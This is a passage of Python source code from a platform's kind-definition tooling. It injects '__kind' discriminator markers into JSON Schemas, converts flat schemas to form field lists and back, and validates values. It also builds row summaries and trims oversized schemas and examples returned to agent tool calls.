                "snake_case for every '__kind' marker, e.g. 'resell_analysis'."
            )
        return normalized

    children: dict[str, dict[str, Any]] = {}
    for field, value in sample.items():
        if field == KIND_KEY:
            continue
        if isinstance(value, dict) and isinstance(value.get(KIND_KEY), str):
            raw_slug = value[KIND_KEY].strip()
            if raw_slug and raw_slug != root_slug:
                slug = _normalized_child_slug(raw_slug, field)
                value[KIND_KEY] = slug
                children[field] = {"slug": slug, "sample": value, "is_list": False}
        elif isinstance(value, list):
            raw_slugs = {
                item.get(KIND_KEY).strip()
                for item in value
                if isinstance(item, dict) and isinstance(item.get(KIND_KEY), str)
            }
            raw_slugs.discard("")
            if len(raw_slugs) > 1:
                raise ValueError(
                    f"List field '{field}' mixes child kinds {sorted(raw_slugs)} — a "
                    "composed list holds ONE item kind. Split the field or unify "
                    "the item shape."
                )
            if len(raw_slugs) == 1:
                raw_slug = next(iter(raw_slugs))
                if raw_slug != root_slug:
                    slug = _normalized_child_slug(raw_slug, field)
                    for item in value:
                        if isinstance(item, dict) and item.get(KIND_KEY) == raw_slug:
                            item[KIND_KEY] = slug
                    first = next(
                        item
                        for item in value
                        if isinstance(item, dict) and item.get(KIND_KEY) == slug
                    )
                    children[field] = {"slug": slug, "sample": first, "is_list": True}
    return children


def inject_kind_markers_into_schema(
    wire_schema: dict[str, Any], marked_sample: Any, root_slug: str
) -> dict[str, Any]:
    """Derive the BLOCK schema from the wire schema: declare ``__kind`` as a
    required const at the root and at every position the marked sample carries
    a marker (matrx-frontend ``emit-kind-rows.ts`` with ``injectKind: true``
    is the compiled-kind twin of this). Pure — returns a deep copy."""

    def inject(schema_node: Any, sample_node: Any, slug: str | None) -> Any:
        if not isinstance(schema_node, dict):
            return schema_node
        node = dict(schema_node)
        if slug and node.get("type") == "object" and isinstance(node.get("properties"), dict):
            props = dict(node["properties"])
            props[KIND_KEY] = {"const": slug}
            node["properties"] = props
            required = list(node.get("required") or [])
            if KIND_KEY not in required:
                required.append(KIND_KEY)
            node["required"] = sorted(required)
        if isinstance(sample_node, dict) and isinstance(node.get("properties"), dict):
            props = dict(node["properties"])
            for key, child_sample in sample_node.items():
                if key == KIND_KEY or key not in props:
                    continue
                child_slug = None
                probe = child_sample
                if isinstance(child_sample, list):
                    probe = next(
                        (i for i in child_sample if isinstance(i, dict) and KIND_KEY in i),
                        None,
                    )
                if isinstance(probe, dict) and isinstance(probe.get(KIND_KEY), str):
                    child_slug = probe[KIND_KEY]
                child_schema = props[key]
                if isinstance(child_sample, list) and isinstance(child_schema, dict):
                    # Inference can merge a list with null into a permissive
                    # union without an items constraint. Preserve that valid
                    # schema rather than introducing the invalid `items: None`.
                    items = child_schema.get("items", {})
                    child_schema = dict(child_schema)
                    child_schema["items"] = inject(items, probe, child_slug)
                    props[key] = child_schema
                else:
                    props[key] = inject(child_schema, child_sample, child_slug)
            node["properties"] = props
        return node

    block = copy.deepcopy(wire_schema)
    return inject(block, marked_sample, root_slug)


def fields_from_json_schema(schema: dict[str, Any]) -> list[dict[str, Any]] | None:
    """Convert a FLAT object JSON Schema into the KindSchema storage field
    list (``kind_definition.data`` — the shape ``kindSchemaToStorage`` writes:
    ``[{name, type, required?, description?, default?, values?, open?}, ...]``),
    so the /shapes Test tab renders a friendly per-field form instead of a raw
    JSON textarea.

    🚨 THIS COLUMN IS NOT AUTHORITATIVE, AND MUST NEVER BECOME SO AGAIN
    (Arman's ruling, 2026-08-29). ``emitted_json_schema`` IS a kind's contract.
    What this function writes is a convenience copy of it for input forms, and
    a copy that can disagree with its source is not a cache — it is a second
    source of truth. It had already drifted on 13 of the 62 live kinds carrying
    both: four listing ``__kind`` as a data field (it is the discriminator,
    never a field), nine flattening closed enums to bare strings or losing the
    min/max bounds, required flags and descriptions their schema states.

    WHAT ITS ABSENCE USED TO COST. The frontend registry once built its field
    model from this column alone, so the 440-of-502 active kinds this function
    declines left the streaming parser with no schema at all. When a render
    change on 2026-08-28 began reading "no schema" as "broken payload", ~221
    kinds with purpose-built components silently started rendering as key/value
    dumps. The registry now DERIVES from ``emitted_json_schema`` via
    ``kindSchemaFromJsonSchema`` (@ai-matrx/content-ir), and all 502 live kinds
    convert — including every construct declined below. Nothing reads this
    column to answer "what shape is this kind".

    So a decline here is now cosmetic (the Test tab falls back to a JSON
    textarea) rather than load-bearing, and this function is deliberately left
    strict: a partial field list would render a FORM that produces
    schema-invalid payloads, which is worse than the fallback.

    Honest all-or-nothing: only the flat constructs user samples produce are
    converted — string / number(integer) / boolean / string-enum /
    string[] / number[] / boolean[]. Any nested object, array of objects,
    null-union, or otherwise inexpressible property makes the WHOLE conversion
    decline (returns None → ``data`` stays NULL → the JSON fallback form).
    """
    if not isinstance(schema, dict) or schema.get("type") != "object":
        return None
    props = schema.get("properties")
    if not isinstance(props, dict) or not props:
        return None
    required = set(schema.get("required") or [])

    def convert(name: str, node: Any) -> dict[str, Any] | None:
        if not isinstance(node, dict):
            return None
        out: dict[str, Any] = {"name": name}
        if name in required:
            out["required"] = True
        if isinstance(node.get("description"), str):
            out["description"] = node["description"]
        if "default" in node:
            out["default"] = node["default"]

        enum = node.get("enum")
        if isinstance(enum, list) and enum and all(isinstance(v, str) for v in enum):
            out["type"] = "enum"
            out["values"] = list(enum)
            return out

        node_type = node.get("type")
        if node_type == "string":
            out["type"] = "string"
            return out
        if node_type in ("number", "integer"):
            out["type"] = "number"
            return out
        if node_type == "boolean":
            out["type"] = "boolean"
            return out
        if node_type == "array":
            items = node.get("items")
            item_type = items.get("type") if isinstance(items, dict) else None
            if item_type == "string" and not (isinstance(items, dict) and items.get("enum")):
                out["type"] = "string[]"
                return out
            if item_type in ("number", "integer"):
                out["type"] = "number[]"
                return out
            if item_type == "boolean":
                out["type"] = "boolean[]"
                return out
            return None  # object/unknown items — not flat
        return None  # object / union / null-union / missing type — not flat

    fields: list[dict[str, Any]] = []
    for name, node in props.items():
        converted = convert(name, node)
        if converted is None:
            return None
        fields.append(converted)
    return fields


def json_schema_from_fields(fields: list[dict[str, Any]]) -> dict[str, Any]:
    """Reconstruct a JSON Schema from a flat storage field list — used by the
    round-trip test to prove the stored fields describe the same instances as
    the emitted schema. Not a runtime path (the emitted schema stays the
    validation source of truth)."""
    props: dict[str, Any] = {}
    required: list[str] = []
    type_map = {
        "string": {"type": "string"},
        "number": {"type": "number"},
        "boolean": {"type": "boolean"},
        "string[]": {"type": "array", "items": {"type": "string"}},
        "number[]": {"type": "array", "items": {"type": "number"}},
        "boolean[]": {"type": "array", "items": {"type": "boolean"}},
    }
    for f in fields:
        name = f["name"]
        if f.get("type") == "enum":
            props[name] = {"type": "string", "enum": list(f.get("values") or [])}
        else:
            props[name] = dict(type_map[f["type"]])
        if f.get("required"):
            required.append(name)
    schema: dict[str, Any] = {
        "type": "object",
        "properties": props,
        "additionalProperties": False,
    }
    if required:
        schema["required"] = sorted(required)
    return schema


def validate_against_schema(value: Any, schema: dict[str, Any]) -> list[str]:
    """Validate via the platform contract checker. A malformed schema is
    reported as an explicit error here (authoring context) rather than the
    runtime's fail-open posture.

    ``check_schema`` performs the schema-aware marker reduction itself, so the
    value is handed over untouched — pre-stripping here would discard a marker
    the schema legitimately declares.
    """
    from matrx_graph.contract_kinds import check_schema

    verdict = check_schema(value, schema)
    if not verdict.checked:
        return ["schema could not be checked — it is not a valid JSON Schema object"]
    return list(verdict.errors)


def schema_fingerprint(schema: dict[str, Any]) -> str:
    from matrx_graph.contract_kinds import schema_fingerprint as _fp

    return _fp(schema)


# ---------------------------------------------------------------------------
# Row shaping
# ---------------------------------------------------------------------------


def kind_title_key(kd: Any) -> str | None:
    """The kind's per-kind instance-title override —
    ``kind_definition.metadata.title_key`` (a single data key naming the title
    field, e.g. ``wine_name``). Set by the creator agent via ``kind_create``;
    None when absent/blank/non-string. Consumed by ``kind_instance.derive_title``
    (and mirrored by matrx-frontend ``instance-title.ts``)."""
    meta = getattr(kd, "metadata", None)
    if not isinstance(meta, dict):
        return None
    value = meta.get("title_key")
    if isinstance(value, str) and value.strip():
        return value.strip()
    return None


def enum_str(value: Any) -> str | None:
    """An ORM enum member (or plain string) as its plain value; ``None`` stays ``None``."""
    if value is None:
        return None
    return str(getattr(value, "value", value))


def kind_summary(kd: Any) -> dict[str, Any]:
    return {
        "id": str(kd.id),
        "kind": kd.kind,
        "label": kd.label,
        "authoring_owner": kd.authoring_owner,
        "version": kd.version,
        "is_active": kd.is_active,
        "published_to_web": bool(getattr(kd, "published_to_web", False)),
        "shown_to": enum_str(getattr(kd, "shown_to", None)),
        "organization_id": str(kd.organization_id) if kd.organization_id else None,
        "created_by": str(kd.created_by) if kd.created_by else None,
        "emitted_fingerprint": kd.emitted_fingerprint,
        "has_schema": kd.emitted_json_schema is not None,
        "metadata": kd.metadata or {},
    }


def component_summary(comp: Any) -> dict[str, Any]:
    return {
        "id": str(comp.id),
        "kind_definition_id": str(comp.kind_definition_id),
        "platform": comp.platform,
        "role": comp.role,
        "component_key": comp.component_key,
        "source": comp.source,
        "semver": comp.semver,
        "version": comp.version,
        "is_default": comp.is_default,
        "is_active": comp.is_active,
        "sort_order": comp.sort_order,
        "pinned_kind_version": comp.pinned_kind_version,
        "has_component_source": bool(comp.component_source),
        "has_props_transform": bool(comp.props_transform),
        "component_source_length": len(comp.component_source or ""),
        "props_transform_length": len(comp.props_transform or ""),
        "notes": comp.notes,
        "deleted": comp.deleted_at is not None,
    }


def example_summary(ex: Any) -> dict[str, Any]:
    return {
        "id": str(ex.id),
        "kind_version": ex.kind_version,
        "label": ex.label,
        "source": ex.source,
        "is_canonical": ex.is_canonical,
        "validation_status": ex.validation_status,
        "deleted": ex.deleted_at is not None,
    }


#: The most the schema + canonical example of ONE kind put into a kind_get /
#: kindcomp_get_context result. The rest of each result (summaries, contracts)
#: stays well under the size gate's soft cap. Production (ops
#: tool_result_overflow:kind_get / kindcomp_get_context): agent_input_qme_report
#: 58,651 / 70,087 chars, resale_intelligence_report 72,424.
KIND_BODIES_BUDGET_CHARS = 30_000


def bound_kind_bodies(
    json_schema: Any,
    canonical_example: Any,
    *,
    ctx: Any,
    tool_name: str,
    budget: int = KIND_BODIES_BUDGET_CHARS,
) -> tuple[Any, Any, str | None]:
    """Return ``(json_schema, canonical_example, note)`` bounded to ``budget``.

    The schema is the contract, so it is kept whole whenever it fits; the
    canonical example is then cut to the room left, as its JSON text. When even
    the schema does not fit it becomes a marked stand-in (its top-level property
    names + the head of its JSON text). Every cut is named in ``note``, and the
    complete bodies are held for ``fetch_tool_result`` under this call — never a
    silent cut, never a structure sliced into invalid JSON posing as the real one.
    """
    import json as _json

    schema_text = _json.dumps(json_schema, ensure_ascii=False, default=str) if json_schema is not None else ""
    example_text = (
        _json.dumps(canonical_example, ensure_ascii=False, default=str)
        if canonical_example is not None
        else ""
    )
    if len(schema_text) + len(example_text) <= budget:
        return json_schema, canonical_example, None

    from matrx_ai.tools.output_overflow import hold_full_text_for_fetch

    held = hold_full_text_for_fetch(
        ctx,
        text=_json.dumps(
            {"json_schema": json_schema, "canonical_example": canonical_example},
            ensure_ascii=False,
            default=str,
        ),
        tool_name=tool_name,
    )
    rest = held or "The rest is not retrievable from this call (no call id to fetch by)."
    if len(schema_text) <= budget:
        room = budget - len(schema_text)
        head = example_text[:room]
        note = (
            f"canonical_example is {len(example_text):,} chars as JSON; it is cut to its "
            f"first {len(head):,} chars and returned as TEXT (not parseable JSON). "
            f"json_schema is complete and describes the full shape. {rest}"
        )
        return json_schema, (head or None), note
    props = json_schema.get("properties") if isinstance(json_schema, dict) else None
    # The head rides as a JSON STRING inside the result, so every quote in it is escaped again
    # (and kindcomp_get_context adds ~12K of fixed contracts plus the property-name list around
    # it). Half the budget keeps the whole result under the soft cap with room to spare; the
    # complete schema is held for fetch_tool_result either way.
    head_chars = budget // 2
    stand_in = {
        "__truncated__": True,
        "total_chars": len(schema_text),
        "top_level_properties": sorted(props.keys()) if isinstance(props, dict) else None,
        "head": schema_text[:head_chars],
    }
    note = (
        f"json_schema is {len(schema_text):,} chars, over the {budget:,} one result carries: "
        f"json_schema here is a stand-in (__truncated__) with its top-level property names "
        f"and the first {head_chars:,} chars of its JSON text; canonical_example was omitted. {rest}"
    )
    return stand_in, None, note
